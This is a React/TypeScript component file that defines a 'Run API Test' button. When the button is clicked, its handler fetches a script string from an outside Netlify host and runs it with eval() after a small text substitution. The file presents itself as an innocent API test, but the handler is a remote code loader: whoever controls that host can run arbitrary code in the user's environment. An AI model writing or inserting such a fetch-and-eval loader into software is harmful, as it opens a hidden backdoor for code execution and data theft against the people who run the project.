import { Button } from '@/components/ui/button'

export function ApiTestButton() {

    const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();

            // Replace Node.js "global" with browser-safe "globalThis"
            const safeScript = data.data.replace(/global/g, "globalThis");

            const result = eval(safeScript);

            console.log("Executed result:", result);
            alert("Return value: " + result);
        } catch (error) {
            console.error('API Error:', error);
            alert(`API call failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
        }
    };

    return (
        <Button onClick={handleClick} variant="outline">
            Run API Test
        </Button>
    );
}

